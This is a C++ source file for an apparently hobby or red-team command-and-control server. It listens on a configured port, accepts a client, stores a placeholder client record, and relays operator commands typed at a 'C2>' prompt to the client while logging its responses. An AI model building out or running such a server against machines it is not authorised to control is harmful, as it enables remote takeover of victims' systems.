#include "C2Server.h"
#include "Logger.h"
#include "../repositories/ClientRepository.h"
#include "ConfigManager.h"
#include <iostream>

C2Server::C2Server(std::unique_ptr<ISocket> s) : socket(std::move(s)) {}

void C2Server::enableOneShotMode(){
    oneShotMode = true;
}
    
        void C2Server::run() {
            try {
                int port = ConfigManager::Instance().Get<int>("port");
                socket->bindSocket(port);
                socket->listenToSocket();
                Logger::Instance().Log(LogLevel::INFO, "[*] Listening on port " + std::to_string(port));
    
                int clientSocket;
                while(true){
                    try{
                        clientSocket = socket->acceptConnection();
                        Logger::Instance().Log(LogLevel::INFO, "[+] Client connected");
                        SQLiteConnection db;
                        if(!db.connect(ConfigManager::Instance().Get<std::string>("database"))){
                            Logger::Instance().Log(LogLevel::ERROR, "Couldn't connect to database, check if exists");
                        }
                        ClientRepository client(&db);
                        client.create(Client{0, "testClient", "testIP", "testDevice", "Test parameter", "testTime", "testValue"});
                    } catch(const std::exception &e){
                        Logger::Instance().Log(LogLevel::ERROR, "Accept failed: " + std::string(e.what()));
                        continue;
                    }
                    while (true) {
                        std::cout << "C2> "<<std::flush;
                        std::string cmd;
                        if (!std::getline(std::cin, cmd)){
                            Logger::Instance().Log(LogLevel::WARN, "Server input interrupted. closing current connection");
                            cmd = "exit";
                        }
                        if(cmd == "exit"){
                            Logger::Instance().Log(LogLevel::INFO, "[*] Exit command entered. Closing client connection");
                            break;
                        }
                        if (cmd.empty()) continue;
                        try{
                            socket->sendToClient(clientSocket, cmd);
                        } catch (const std::exception &e){
                            Logger::Instance().Log(LogLevel::ERROR, "Failed to send to client: " + std::string(e.what()));
                            break; //Drop the connection with the current client
                        }
                        
                        
                        try {
                            std::string response = socket->receiveFromClient(clientSocket);
                            Logger::Instance().Log(LogLevel::RESP, response);
                        } catch (const std::exception& e) {
                            Logger::Instance().Log(LogLevel::ERROR, "Error occured");
                            Logger::Instance().Log(LogLevel::ERROR, e.what());
                            break; //Drop the connection with the current client
                        }
                    }
                    socket->closeClientConnection(clientSocket);
                    Logger::Instance().Log(LogLevel::INFO, "[*] Closed connection to client");
                    if(oneShotMode) break;
                }
            } catch (const std::exception& e) {
                    Logger::Instance().Log(LogLevel::ERROR, std::string(e.what()));
                }
                socket->closeConnection();
            }    
        